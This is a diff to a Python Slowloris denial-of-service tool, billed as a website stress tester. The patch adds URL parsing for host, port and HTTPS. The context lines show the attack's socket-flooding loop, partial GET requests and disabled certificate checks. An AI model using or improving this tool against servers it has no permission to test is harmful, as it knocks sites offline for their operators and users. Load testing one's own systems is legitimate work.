@@ -5,6 +5,7 @@ import random
 import socket
 import sys
 import time
+import urllib.parse
 
 parser = argparse.ArgumentParser(
     description="Slowloris, low bandwidth stress test tool for websites"
@@ -75,6 +76,50 @@ if not args.host:
     parser.print_help()
     sys.exit(1)
 
+# Parse URL
+logging.debug("Starting to parse URL")
+
+argurl = args.host
+argport = args.port
+arghttps = args.https
+
+if "//" not in argurl:
+    url = "//" + argurl # Prepend the input with double slash, 
+                        # if the input doesn't have any, 
+                        # as suggested in the documentation: 
+                        # https://docs.python.org/3/library/urllib.parse.html
+else: url = argurl
+
+out = urllib.parse.urlparse(url)
+hostname = out.hostname
+
+if out.scheme == "https": # URL overrides cmdline params
+    https = True
+elif out.scheme == "http":
+    https = False
+elif out.scheme == "":
+    https = arghttps
+else:
+    print("Scheme specified in URL other than HTTP or HTTPS isn't currently supported.")
+    exit(1)
+
+if https != arghttps:
+    logging.warning("Command line parameter --https is being overridden by URL.")
+
+
+if out.port == None: # Set port to cmdline param if no port defined in URL
+    port = argport
+else:
+    port = out.port
+
+if port != argport:
+    logging.warning("Command line parameter -p / --port is being overridden by URL.")
+
+# Output variables
+hostname = str(hostname)
+port = int(port)
+https = bool(https)
+
 if args.useproxy:
     # Tries to import to external "socks" library
     # and monkey patches socket.socket to connect over
@@ -107,7 +152,7 @@ def send_header(self, name, value):
     self.send_line(f"{name}: {value}")
 
 
-if args.https:
+if https:
     logging.info("Importing ssl module")
     import ssl
 
@@ -151,13 +196,13 @@ def init_socket(ip: str):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
 
-    if args.https:
+    if https:
         ctx = ssl.create_default_context()
         ctx.check_hostname = False
         ctx.verify_mode = ssl.CERT_NONE
-        s = ctx.wrap_socket(s, server_hostname=args.host)
+        s = ctx.wrap_socket(s, server_hostname=hostname)
 
-    s.connect((ip, args.port))
+    s.connect((ip, port))
 
     s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")
 
@@ -191,7 +236,7 @@ def slowloris_iteration():
     logging.info("Creating %s new sockets...", diff)
     for _ in range(diff):
         try:
-            s = init_socket(args.host)
+            s = init_socket(hostname)
             if not s:
                 continue
             list_of_sockets.append(s)
@@ -201,7 +246,7 @@ def slowloris_iteration():
 
 
 def main():
-    ip = args.host
+    ip = hostname
     socket_count = args.sockets
     logging.info("Attacking %s with %s sockets.", ip, socket_count)
 
